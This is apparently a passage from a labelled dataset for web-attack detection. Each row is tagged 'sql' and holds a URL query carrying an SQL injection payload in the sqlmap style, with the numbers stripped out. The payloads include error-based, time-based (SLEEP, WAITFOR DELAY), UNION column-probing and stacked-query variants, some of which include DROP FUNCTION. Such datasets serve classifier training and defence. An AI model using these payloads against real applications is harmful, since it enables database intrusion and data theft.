2999,sql,". . . / ? = & = & =   "" ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( " vYtl " = " "
3000,sql,". . . / ? = & = & =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( " zvvV " = " "
3001,sql,". . . . / / / / ? = & =   ' ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ' Aokv ' = ' "
3002,sql,". . / / / ? = & =   % "" RLIKE SLEEP ( ) AND " % " = " "
3003,sql,". . . . / / / ? = & = & =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' TDat ' = ' "
3004,sql,". . . / / / / ? = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' DlGe ' = ' "
3005,sql,". . ? = & =    AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) "
3006,sql,". . / / ? =   ' ) AND = AND ( ' dypW ' LIKE ' "
3007,sql,". . / / / / ? =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " INQY " = " "
3008,sql,". . . . / / / ? = & = & =  - ' ) UNION ALL SELECT  -- "
3009,sql,". . / / ? = & =   ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' eSLo ' = ' "
3010,sql,". . . . / / ? = & =  - "" UNION ALL SELECT  -- "
3011,sql,". . ? = & =  - "" UNION ALL SELECT , , , ,  -- "
3012,sql,". . . ? = & = & =   ) AND =  -- "
3013,sql,". . . / / / / ? = & =   ' ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( ' WaLy ' = ' "
3014,sql,". . ? = & = & = & =   % ' AND =  -- "
3015,sql,". . . / / / ? = & = & =  - % "" UNION ALL SELECT , , , , , , , , ,  -- "
3016,sql,". . . / / / / ? = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL # "
3017,sql,". . . . ? = & = & =  - "" UNION ALL SELECT # "
3018,sql,". . . . / / / ? = & =   AND =  -- "
3019,sql,". . . / / / / ? = & = & = & =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )  -- "
3020,sql,". . . . / / / ? = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) )  -- "
3021,sql,". . . . / / / ? = & = & =   ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( = "
3022,sql,". . / / / ? = & =   ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION SDVI --"
3023,sql,". . . . / / / / ? = & = & =    AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) # "
3024,sql,". . . / ? =   ' ) ORDER BY # "
3025,sql,". . . / ? =  - ) ) ) UNION ALL SELECT , , , , , , # "
3026,sql,". . / / / ? = & = & = & =  - % "" UNION ALL SELECT , , , , , , , # "
3027,sql,". . . . / / / / ? =   "" ) ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ( " oJxU " = " "
3028,sql,". . / ? = & =   ) ORDER BY # "
3029,sql,". . / / ? = & =  - "" UNION ALL SELECT , , , , , , , ,  -- "
3030,sql,". . . / / ? = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' lXEF ' = ' "
3031,sql,". . . ? = & =  - UNION ALL SELECT , , , , , , , ,  -- "
3032,sql,". . / / / / ? = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' uROo ' = ' "
3033,sql,". . . . / / ? = & =   ) ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ( = "
3034,sql,". . . . ? = & =   % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION BYZQ --"
3035,sql,". . . ? = & =   ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
3036,sql,". . / / ? =  - % ' ) ) UNION ALL SELECT , , , , , , ,  -- "
3037,sql,". . / ? = & = & =  - UNION ALL SELECT , , , # "
3038,sql,". . . ? = & =   % ' ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3039,sql,". . . . / / / ? = & = & =  - ) ORDER BY  -- "
3040,sql,". . . / ? = & = & =   ' AND = AND ' GwGZ ' LIKE ' "
3041,sql,". . . / / / / ? = & =   ' ) ) AND SLEEP ( ) AND ( ( ' zqqI ' = ' "
3042,sql,". . . . / / / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL # "
3043,sql,". . . . ? =   ORDER BY  -- "
3044,sql,". . . . ? = & =   ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' yvxE ' = ' "
3045,sql,". . . . / / / ? = & =   % ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' % ' = ' "
3046,sql,". . / / / ? = & =   ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION Cptc --"
3047,sql,". . . . ? = & = & =   AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) "
3048,sql,". . / / / ? = & = & =   ) AND = # "
3049,sql,". . . . ? = & = & =  - ' UNION ALL SELECT , , # "
3050,sql,". . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , ,  -- "
3051,sql,". . / / ? = & =   % ' ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' % ' = ' "
3052,sql,". . . . / ? =   "" ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
3053,sql,". . . / / / / ? = & = & = & =   ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
3054,sql,". . . . ? = & =   ORDER BY  -- "
3055,sql,". . . . / / / / ? = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
3056,sql,". . . . / / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3057,sql,". . . / / ? =  - ' ) UNION ALL SELECT , , ,  -- "
3058,sql,". . . . / ? = & = & =  - ) ) ) ORDER BY  -- "
3059,sql,". . . . / / ? =   ) ) ) ; SELECT SLEEP ( ) AND ( ( ( = "
3060,sql,". . . ? =   ' ) AND = # "
3061,sql,". . . . / ? = & =  - ) ) UNION ALL SELECT , # "
3062,sql,". . . / / / ? =   % ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' % ' = ' "
3063,sql,". . . / / ? =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " BUon " = " "
3064,sql,". . ? = & = & = & =  - ) ORDER BY  -- "
3065,sql,". . . . ? = & = & = & =    AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) "
3066,sql,". . . / / / ? = & = & =    AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) # "
3067,sql,". . . / / ? = & = & =  - ' ) ) ORDER BY # "
3068,sql,". . ? = & =  - ' UNION ALL SELECT , , ,  -- "
3069,sql,". . . . / / / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3070,sql,". . . / / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
3071,sql,". . . . / / ? = & = & =  - ' UNION ALL SELECT , , , ,  -- "
3072,sql,". . . . / ? = & = & = & =   ' ) ) ) AND =  -- "
3073,sql,". . . / ? =   "" ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3074,sql,". . / ? = & =   ) ) ; WAITFOR DELAY ' : : '  --"
3075,sql,". . . / / / / ? = & = & =  - ' ) UNION ALL SELECT , , , ,  -- "
3076,sql,". . . ? =   UNION ALL SELECT NULL , NULL , NULL # "
3077,sql,". . . ? = & = & =  - ) ) UNION ALL SELECT , , , , , , # "
3078,sql,". . . . ? = & =   ' ) ) ; SELECT SLEEP ( ) AND ( ( ' tkGC ' LIKE ' "
3079,sql,". . . / / / ? = & = & = & =   AND MAKE_SET ( = , )  -- "
3080,sql,". . . . / / / / ? = & = & = & =   ' ) ) AND = AND ( ( ' jGqe ' = ' "
3081,sql,". . . / / ? = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND " pOHc " LIKE " "
3082,sql,". . . / / ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3083,sql,". . / / ? = & =   % ' AND = % "
3084,sql,". . . . / / / ? = & = & = & =   UNION ALL SELECT NULL # "
3085,sql,". . . . / / / / ? = & =  - % "" UNION ALL SELECT , , , # "
3086,sql,". . . . / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3087,sql,". . . ? = & =   "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " PYwo " = " "
3088,sql,". . / / / ? = & =   ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
3089,sql,". . . / / / ? = & = & = & =   ' ) ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( ( ' dzzL ' = ' "
3090,sql,". . . . / / / / ? = & =  - ' ) ) ) UNION ALL SELECT , # "
3091,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , ,  -- "
3092,sql,". . . / ? = & =  - "" UNION ALL SELECT , , , , ,  -- "
3093,sql,". . / / ? =   ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' pVcx ' = ' "
3094,sql,". . / ? = & = & = & =   % ' AND = # "
3095,sql,". . / ? =   % ' RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ' % ' = ' "
3096,sql,". . . / / / / ? =   ) UNION ALL SELECT NULL # "
3097,sql,". . . . / ? =   ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' eKia ' = ' "
3098,sql,". . . . / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3099,sql,". . / ? =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
3100,sql,". . / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3101,sql,". . . ? =   ' ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ' kIwp ' LIKE ' "
3102,sql,". . . / / ? = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " eTcA " = " "
3103,sql,". . . . / / ? =  - % "" UNION ALL SELECT , , , , , ,  -- "
3104,sql,". . . . / / / ? = & = & =   ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
3105,sql,". . / ? = & = & = & =   UNION ALL SELECT NULL , NULL , NULL # "
3106,sql,". . . . / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3107,sql,". . . / / ? = & = & =   AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) # "
3108,sql,". . . ? = & = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
3109,sql,". . . . / / / / ? = & =  - UNION ALL SELECT , # "
3110,sql,". . / / ? = & = & =   % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3111,sql,". . . / / / / ? = & = & = & =  - ) ORDER BY # "
3112,sql,". . . . / / ? = & = & =   ' ) AND MAKE_SET ( = , ) AND ( ' bRsZ ' LIKE ' "
3113,sql,". . ? = & = & = & =   "" ) AND SLEEP ( ) AND ( " fVcT " LIKE " "
3114,sql,". . . / / / / ? = & =   ' ) ) ORDER BY # "
3115,sql,". . . . ? = & = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " eTcA " = " "
3116,sql,". . . . / / ? =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' vhzs ' = ' "
3117,sql,". . . . ? = & = & = & =   "" ) ORDER BY # "
3118,sql,". . . ? = & =   % ' ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ' % ' = ' "
3119,sql,". . / ? =  - % ' ) UNION ALL SELECT  -- "
3120,sql,". . / / / ? = & =  - ) ORDER BY  -- "
3121,sql,". . . / / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3122,sql,". . / ? = & = & = & =  - "" UNION ALL SELECT , # "
3123,sql,". . / / / / ? =   % ' ) ) ORDER BY  -- "
3124,sql,". . / ? =   ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
3125,sql,". . / / / / ? = & = & =  - "" UNION ALL SELECT , , , , , , # "
3126,sql,". . . ? = & = & =   ' ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3127,sql,". . . . / ? = & =  - % "" UNION ALL SELECT , , , , , , , , # "
3128,sql,". . . . / / / ? = & =   % ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' % ' = ' "
3129,sql,". . . . / / / ? =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3130,sql,". . . . / / / ? =   ) ) ) AND = AND ( ( ( = "
3131,sql,". . . . ? =   ' ) AND SLEEP ( ) AND ( ' rLaj ' = ' "
3132,sql,". . . . / ? = & =  - ) ORDER BY  -- "
3133,sql,". . . ? =   ' ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
3134,sql,". . ? = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' bKNm ' LIKE ' "
3135,sql,". . . / / ? = & = & = & =   ' ) ) ) AND = AND ( ( ( ' ZDQA ' = ' "
3136,sql,". . . / ? =   ) ) ) ; WAITFOR DELAY ' : : '  --"
3137,sql,". . / ? = & = & = & =   % "" AND = # "
3138,sql,". . . / / / / ? =   % ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ' % ' = ' "
3139,sql,". . / / / / ? = & = & =   ) ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ( = "
3140,sql,". . . . / / / / ? = & = & = & =   "" ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( " pmfF " = " "
3141,sql,". . . . / / / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3142,sql,". . . / / ? = & = & =   % ' UNION ALL SELECT NULL , NULL # "
3143,sql,". . ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3144,sql,". . . . / ? = & =   ' ) ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ( ' FhRq ' = ' "
3145,sql,". . . . ? = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " EFcZ " LIKE " "
3146,sql,". . . . / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL -- "
3147,sql,". . . / / / ? =   ) ) ) ; WAITFOR DELAY ' : : '  --"
3148,sql,". . . / / / / ? =   "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( " eEOw " = " "
3149,sql,". . . / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3150,sql,". . / ? = & =  - ' ) UNION ALL SELECT , , , , ,  -- "
3151,sql,". . . / / ? = & =   % ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' % ' = ' "
3152,sql,". . / / ? = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL -- "
3153,sql,". . ? = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND " xKPi " = " "
3154,sql,". . ? = & =   ' AND SLEEP ( ) AND ' gsAz ' LIKE ' "
3155,sql,". . ? = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' SCnR ' LIKE ' "
3156,sql,". . . / / / / ? = & =   ' ) ORDER BY # "
3157,sql,". . / ? = & = & = & =   "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " PDCy " = " "
3158,sql,". . . / / / / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL -- "
3159,sql,". . . / / / ? =   % ' ) ) AND SLEEP ( ) # "
3160,sql,". . . / / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3161,sql,". . . . / / / ? =  - ' ) ) UNION ALL SELECT , # "
3162,sql,". . . . / ? = & =   ) ORDER BY  -- "
3163,sql,". . / ? = & = & = & =   AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
3164,sql,". . . ? = & = & =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3165,sql,". . / / ? = & =   % ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ' % ' = ' "
3166,sql,". . / ? =   ' ) UNION ALL SELECT NULL , NULL # "
3167,sql,". . / / / ? = & = & = & =   ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( = "
3168,sql,". . . ? =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3169,sql,". . . / / / ? = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' RykU ' LIKE ' "
3170,sql,". . . . / / / / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3171,sql,". . / / / / ? =   ' ) ) UNION ALL SELECT NULL # "
3172,sql,". . . . ? = & = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ' obOb ' = ' "
3173,sql,". . . . / / ? = & =   ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( = "
3174,sql,". . . . / / / ? = & =  - UNION ALL SELECT , , , , , , ,  -- "
3175,sql,". . / ? = & = & = & =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " wwCB " = " "
3176,sql,". . . / ? = & = & = & =   ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP )  -- "
3177,sql,". . / / / / ? = & = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ' YfBb ' = ' "
3178,sql,". . / ? =   ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( = "
3179,sql,". . / / ? =   ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' BZeZ ' LIKE ' "
3180,sql,". . . / ? = & = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND " juNg " = " "
3181,sql,". . . . / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3182,sql,". . . / / / / ? = & = & = & =   UNION ALL SELECT NULL # "
3183,sql,". . . . / ? = & = & = & =   ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' CqFF ' LIKE ' "
3184,sql,". . . . / / / / ? = & = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' DlGe ' = ' "
3185,sql,". . . . / / / / ? = & = & =   ' RLIKE SLEEP ( ) AND ' EyKI ' LIKE ' "
3186,sql,". . / / ? = & = & =   "" ) ) AND SLEEP ( ) # "
3187,sql,". . . . / / / ? = & =   "" ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3188,sql,". . . ? = & =  - % ' ) UNION ALL SELECT , , , , , , , , ,  -- "
3189,sql,". . ? = & = & =   ' RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ' mxoW ' = ' "
3190,sql,". . . . ? = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " lUqs " = " "
3191,sql,". . . . ? = & = & = & =   ' ) ) AND =  -- "
3192,sql,". . / / / / ? = & = & = & =   ' ) ; SELECT PG_SLEEP ( )  --"
3193,sql,". . / / / / ? =   % ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' % ' = ' "
3194,sql,". . / / ? =   ) ) ) AND = AND ( ( ( = "
3195,sql,". . ? = & = & = & =   ' ) AND =  -- "
3196,sql,". . / / ? = & = & =   ' ) ) ) WAITFOR DELAY ' : : ' AND ( ( ( ' gHrG ' = ' "
